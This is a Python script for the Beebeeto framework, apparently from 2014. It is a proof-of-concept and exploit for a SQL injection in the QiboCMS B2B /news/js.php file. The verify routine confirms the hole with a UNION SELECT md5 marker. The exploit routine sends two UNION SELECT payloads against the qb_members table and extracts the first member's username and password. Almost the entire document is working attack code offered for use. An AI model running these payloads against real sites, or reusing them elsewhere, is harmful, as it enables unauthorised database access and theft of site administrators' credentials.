#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0064',  # 由Beebeeto官方编辑
            'name': '齐博CMS B2B /news/js.php SQL注入漏洞 POC & Exploit',  # 名称
            'author': '大孩小孩',  # 作者
            'create_date': '2014-10-12',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '齐博CMS',  # 漏洞所涉及的应用名称
            'vul_version': ['<=2.0'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['齐博CMS漏洞', 'SQL注入'],  # 漏洞相关tag
            'desc': '齐博CMS B2B /news/js.php文件存在SQL注入漏洞。',  # 漏洞描述
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-053187',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + ("/news/js.php?type=like&keyword=123%%2527%29/**/union/"
                    "**/select/**/1,md5(27657345),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,"
                    "24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23")
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        if '0c3f73ed12e0bb9f8e964f0c26a517d7' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    @classmethod
    def exploit(cls, args):
        vul_url = args['options']['target']
        paload1 = ("/news/js.php?type=like&keyword=123%%2527%29/**/union/**/select/**/1,username,"
                   "3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,"
                   "31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51/**/from/**/"
                   "qb_members/**/LIMIT/**/1%23")
        paload2 = ("/news/js.php?type=like&keyword=123%%2527%29/**/union/**/select/**/1,password,"
                   "3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,"
                   "31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51/**/from/**/"
                   "qb_members/**/LIMIT/**/1%23")
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
        request = urllib2.Request(vul_url + paload1)
        response = urllib2.urlopen(request)
        content = response.read()
        pattern = re.compile(r'.*?<A[^>]*?>(?P<result>[^<>]*?)</A>',re.I|re.S)
        match = pattern.match(content)
        if match == None or match.group('result').strip()=="":
            args['success'] = False
            return args
        else:
            result = match.group('result').strip()
            username = result
            request = urllib2.Request(vul_url + paload2)
            response = urllib2.urlopen(request)
            content = response.read()
            pattern = re.compile(r'.*?<A[^>]*?>(?P<result>[^<>]*?)</A>',re.I|re.S)
            match = pattern.match(content)
            if match == None or match.group('result').strip()=="":
                args['success'] = False
                return args
            else:
                result = match.group('result').strip()
                password = result
                args['success'] = True
                args['poc_ret']['vul_url'] = vul_url
                args['poc_ret']['Username'] = username
                args['poc_ret']['Password'] = password
                return args
        args['success'] = False
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
